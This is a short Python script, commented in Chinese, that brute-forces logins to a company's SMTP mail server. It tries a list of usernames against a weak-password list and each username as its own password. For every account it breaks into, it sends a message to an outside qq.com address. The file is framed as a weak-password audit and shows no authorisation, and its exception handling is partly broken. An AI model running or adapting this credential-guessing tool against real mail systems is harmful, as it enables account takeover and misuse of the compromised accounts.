#-*- coding:utf-8 -*-
#测试公司邮件系统弱密码，
from email.mime.text import MIMEText
import smtplib

#弱密码字典
passList = ['***','***123','abc123','123456']
#用户列表
userList = ['ds','ff','fd','f','fs']
#设置邮箱后缀及服务器地址
last_addr = '@***.com'
smtp_server = 'mail.***.com'
#测试用的接收邮箱
to_addr = '***@qq.com'
#测试内容
context = '飞流直下三千尺，疑是密密太简单'

for user in userList:
    from_addr = user+last_addr
    print('正在测试用户' + from_addr)
    #将用户名加入密码字典，有人将密码设为和用户名一样
    passList.append(user)
    for pwd in passList:
        password = pwd
        print('正在测试密码' + pwd)
        msg = MIMEText(context,'plain','utf-8')
        msg['Subject']='保持童心，儿童节快乐！'
        msg['From'] = from_addr

        #server.set_debuglevel(1)
        try:
            server = smtplib.SMTP(smtp_server,25)
            server.login(from_addr,password)
            server.sendmail(from_addr,[to_addr],msg.as_string())
            server.quit()
            print(from_addr+'发送成功！！！！！！')
            break
        except smtplib.SMTPException as e:
            print('第一：'+str(e))
        except smtplib.SMTPServerDisconnected as f:
            print('第二:'+f)
        except:
            print("服务器服务访问")

    passList.pop()
    print('用户：'+from_addr +'测试完成！')
print(' 测试完成')